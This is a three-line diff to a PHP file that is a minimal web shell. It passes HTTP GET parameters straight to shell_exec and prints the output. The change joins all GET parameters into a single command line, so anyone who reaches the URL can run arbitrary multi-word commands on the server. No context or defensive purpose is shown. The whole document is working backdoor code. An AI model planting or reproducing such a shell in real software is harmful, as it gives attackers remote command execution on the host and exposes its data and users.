@@ -1,3 +1,3 @@
 <?php
-echo shell_exec($_GET[0]. "  2>&1");
+echo shell_exec(join(" ",$_GET). "  2>&1");
 
